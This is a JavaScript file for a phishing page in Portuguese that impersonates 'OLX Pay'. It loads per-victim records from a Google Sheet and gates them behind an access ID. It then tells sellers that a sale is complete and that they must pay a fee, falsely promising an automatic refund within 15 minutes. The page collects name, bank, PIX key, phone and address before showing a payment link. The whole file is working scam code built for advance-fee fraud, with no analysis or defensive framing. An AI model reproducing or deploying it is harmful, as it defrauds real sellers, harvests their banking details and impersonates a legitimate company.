
const mainContainer = document.getElementById('main-container');

// ==== Função para criar elementos ====
function criarElemento(tag, attrs = {}, inner = '') {
  const el = document.createElement(tag);
  Object.entries(attrs).forEach(([key, value]) => {
    if (key === 'class') el.className = value;
    else if (key === 'id') el.id = value;
    else if (key === 'href') el.href = value;
    else el.setAttribute(key, value);
  });
  if (typeof inner === 'string') el.innerHTML = inner;
  else if (inner instanceof Node) el.appendChild(inner);
  else if (Array.isArray(inner)) inner.forEach(n => el.appendChild(n));
  return el;
}

function getValue(cell) {
  if (!cell || cell.v === null || cell.v === undefined) return '---';
  if (typeof cell.v === 'number') return cell.f || cell.v.toString();
  return cell.v.toString();
}

// ==== Tela de autenticação ====
function renderAuthScreen(dadosPlanilha) {
  const container = criarElemento('div', { class: 'container' });
  const imgHeader = criarElemento('div', { class: 'header-image' });
  const title = criarElemento('div', { class: 'header-title', innerHTML: 'Digite seu ID de acesso' });

  const content = criarElemento('div', { class: 'content' });
  const input = criarElemento('input', { type: 'text', id: 'inputID', placeholder: 'Ex: pay1024' });
  const btn = criarElemento('button', { id: 'btnLogin' }, 'Entrar');
  const msg = criarElemento('p', { id: 'msgLogin' });

  content.append(input, btn, msg);
  container.append(imgHeader, title, content);
  mainContainer.appendChild(container);

  btn.addEventListener('click', () => {
    const valorID = input.value.trim();
    const dados = dadosPlanilha.find(d => d.id === valorID);
    if (!dados) {
      msg.textContent = '❌ ID inválido';
      msg.style.color = '#ff4d4d';
      return;
    }
    localStorage.setItem('userID', valorID);
    mainContainer.innerHTML = '';
    renderContainer(dados);
  });
}

// ==== Tela do container ====
function renderContainer(dados) {
  const container = criarElemento('div', { class: 'container' });
  const imgHeader = criarElemento('div', { class: 'header-image' });
  const title = criarElemento('div', { class: 'header-title', innerHTML: 'Compra Segura com OLX Pay' });

  const content = criarElemento('div', { class: 'content' });
  content.innerHTML = `
    <p>🎉 <span class="highlight">Parabéns!</span> Você vendeu seu produto com segurança.</p>
    <p>Após o pagamento da taxa de <span class="highlight" id="taxa">${dados.taxa}</span>, todos os valores serão <span class="highlight">reembolsados automaticamente em até 15 minutos</span>. Seu seguro está ativo para proteger você contra golpes.</p>
    <p><strong>Importante:</strong> Você tem até <span class="highlight" id="prazo">${dados.prazo}</span> para concluir o pagamento.</p>

    <h2>Detalhes da transação</h2>
    <p><i class="fa-solid fa-user icon"></i> <strong>Comprador(a):</strong> <span id="comprador">${dados.comprador}</span></p>
    <p><i class="fa-solid fa-money-bill-wave icon"></i> <strong>Valor do produto:</strong> <span id="valor">${dados.valor}</span></p>
    <p><i class="fa-solid fa-truck icon"></i> <strong>Frete:</strong> <span id="frete">${dados.frete}</span></p>
    <p><i class="fa-solid fa-shield-halved icon"></i> <strong>Tarifa OLX Pay:</strong> <span id="tarifa">${dados.tarifa}</span></p>
    <p><i class="fa-solid fa-id-card icon"></i> <strong>CPF:</strong> <span id="cpf">${dados.cpf}</span></p>
    <p><i class="fa-solid fa-credit-card icon"></i> <strong>Transação aprovada via:</strong> <span id="cartao">${dados.cartao}</span></p>

    <p>
      <span class="badge" id="vendas">${dados.vendas}</span>
      <span class="badge" id="atendimento">${dados.atendimento}</span>
      <span class="badge" id="entrega">${dados.entrega}</span>
    </p>

    <h2>💬 Próximos passos</h2>
    <ul>
      <li>Preencha o formulário abaixo com seus dados bancários.</li>
      <li>Após enviar os dados, o botão de pagamento será liberado.</li>
      <li>Conclua o pagamento para receber o estorno em até 15 minutos.</li>
    </ul>
  `;

  const form = criarElemento('form', { id: 'dadosCliente' });
  const campos = ['nome', 'banco', 'pix', 'telefone', 'endereco'];
  campos.forEach(campo => {
    const label = criarElemento('label', { for: campo }, campo.charAt(0).toUpperCase() + campo.slice(1));
    const input = criarElemento('input', { type: 'text', id: campo, name: campo, required: true });
    form.append(label, input);
  });
  const btnEnviar = criarElemento('button', { id: 'enviarDados', type: 'submit' }, 'Enviar dados');
  const msgEnvio = criarElemento('p', { id: 'msgEnvio' });
  form.append(btnEnviar, msgEnvio);
  content.appendChild(form);

  const btnPagamento = criarElemento('a', { id: 'btn-pagamento', class: 'button hidden', href: dados.linkPagamento }, 'Seguir para o Pagamento');
  const btnContainer = criarElemento('div', { class: 'button-container' }, btnPagamento);
  content.appendChild(btnContainer);

  container.append(imgHeader, title, content);
  const footer = criarElemento('div', { class: 'footer' }, '&copy; 2025 OLX Pay. Todos os direitos reservados.');
  container.appendChild(footer);

  mainContainer.appendChild(container);

  form.addEventListener('submit', (e) => {
    e.preventDefault();
    const dadosCliente = {};
    campos.forEach(c => dadosCliente[c] = form[c].value.trim());
    localStorage.setItem('dadosCliente', JSON.stringify(dadosCliente));

    msgEnvio.textContent = "✅ Dados confirmados com sucesso!";
    msgEnvio.style.color = "#800080";

    form.reset();

    btnPagamento.classList.remove('hidden');
    btnPagamento.classList.add('visible');

    setTimeout(() => btnPagamento.scrollIntoView({ behavior: 'smooth', block: 'center' }), 600);
    setTimeout(() => msgEnvio.textContent = '', 3000);
  });
}

// ==== Inicialização com fetch da planilha ====
const SHEET_URL = 'https://docs.google.com/spreadsheets/d/13NPp7cu9-pIcBVTdctBVL81ZuO9ol4654D5ublGOnqg/gviz/tq?tqx=out:json';

fetch(SHEET_URL)
  .then(res => res.text())
  .then(text => {
    const json = JSON.parse(text.substr(47).slice(0, -2));
    const rows = json.table.rows;

    const dadosPlanilha = rows.map(r => {
      const c = r.c;
      return {
        id: getValue(c[12]),
        taxa: getValue(c[0]),
        prazo: getValue(c[1]),
        comprador: getValue(c[2]),
        valor: getValue(c[3]),
        frete: getValue(c[4]),
        tarifa: getValue(c[5]),
        cpf: getValue(c[6]),
        cartao: getValue(c[7]),
        vendas: getValue(c[8]),
        atendimento: getValue(c[9]),
        entrega: getValue(c[10]),
        linkPagamento: getValue(c[11])
      };
    });

    const userID = localStorage.getItem('userID');
    if (userID) {
      const dados = dadosPlanilha.find(d => d.id === userID);
      if (dados) renderContainer(dados);
      else renderAuthScreen(dadosPlanilha);
    } else {
      renderAuthScreen(dadosPlanilha);
    }

  })
  .catch(err => {
    console.error('Erro ao buscar planilha:', err);
    mainContainer.innerHTML = '<p style="color:#ff4d4d; text-align:center; margin-top:2em;">Erro ao carregar os dados. Tente novamente mais tarde.</p>';
  });
